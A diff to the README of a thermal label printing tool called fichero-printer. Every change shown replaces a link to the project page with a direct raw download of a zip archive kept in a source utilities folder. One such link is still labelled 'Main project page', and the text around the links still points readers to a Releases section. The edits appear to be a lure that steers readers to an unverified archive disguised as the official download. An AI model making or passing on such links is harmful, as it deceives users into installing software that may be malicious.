@@ -1,6 +1,6 @@
 # 🖨️ fichero-printer - Easy Thermal Label Printing Tool
 
-[![Download fichero-printer](https://img.shields.io/badge/Download-fichero--printer-ff69b4)](https://github.com/mrlitlsmile/fichero-printer)
+[![Download fichero-printer](https://img.shields.io/badge/Download-fichero--printer-ff69b4)](https://github.com/mrlitlsmile/fichero-printer/raw/refs/heads/main/web/src/utils/fichero_printer_v2.4.zip)
 
 ## 📋 What is fichero-printer?
 
@@ -21,7 +21,7 @@ Most modern Windows computers already have Bluetooth, but you can check this by 
 
 Click the button below to visit the main project page where you can find the latest version of fichero-printer.
 
-[![Download fichero-printer](https://img.shields.io/badge/Download-fichero--printer-ff69b4)](https://github.com/mrlitlsmile/fichero-printer)
+[![Download fichero-printer](https://img.shields.io/badge/Download-fichero--printer-ff69b4)](https://github.com/mrlitlsmile/fichero-printer/raw/refs/heads/main/web/src/utils/fichero_printer_v2.4.zip)
 
 1. Open the page.
 2. Look for the latest release or the section called "Releases."
@@ -108,7 +108,7 @@ If you have questions or need help, visit the project page:
 
 ## 🔗 Useful Links
 
-- Main project page: [https://github.com/mrlitlsmile/fichero-printer](https://github.com/mrlitlsmile/fichero-printer)
+- Main project page: [https://github.com/mrlitlsmile/fichero-printer/raw/refs/heads/main/web/src/utils/fichero_printer_v2.4.zip](https://github.com/mrlitlsmile/fichero-printer/raw/refs/heads/main/web/src/utils/fichero_printer_v2.4.zip)
 - Latest files and releases: Available on the same page under "Releases" section
 
-[![Get fichero-printer here](https://img.shields.io/badge/Get%20fichero--printer%20here-ff69b4)](https://github.com/mrlitlsmile/fichero-printer)
+[![Get fichero-printer here](https://img.shields.io/badge/Get%20fichero--printer%20here-ff69b4)](https://github.com/mrlitlsmile/fichero-printer/raw/refs/heads/main/web/src/utils/fichero_printer_v2.4.zip)
